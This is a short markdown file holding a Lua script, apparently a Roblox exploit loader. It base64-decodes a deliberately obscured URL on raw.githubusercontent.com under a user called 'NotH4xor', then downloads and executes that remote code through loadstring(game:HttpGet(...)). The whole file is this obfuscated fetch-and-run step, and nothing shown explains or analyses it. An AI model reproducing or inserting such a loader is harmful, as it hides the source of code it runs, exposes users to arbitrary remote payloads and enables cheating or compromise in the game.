# Obfuscated

```
local base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

local function decodeBase64(data)
local decoded = ""
local padding = #data % 4
if padding > 0 then
data = data .. string.rep("=", 4 - padding)
end
data = string.gsub(data, ".", function(x)
if x == "=" then return "" end
local r, f = "", (string.find(base64, x) - 1)
for i = 6, 1, -1 do
r = r .. (math.floor(f / 2^(i-1)) % 2)
end
return r
end)
for i = 1, #data, 8 do
decoded = decoded .. string.char(tonumber(string.sub(data, i, i+7), 2))
end
return decoded
end

local encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vdEg0eG9yLy0vbWFpbi8lMkM="
local decodedUrl = decodeBase64(encodedUrl)

loadstring(game:HttpGet(decodedUrl))()
```
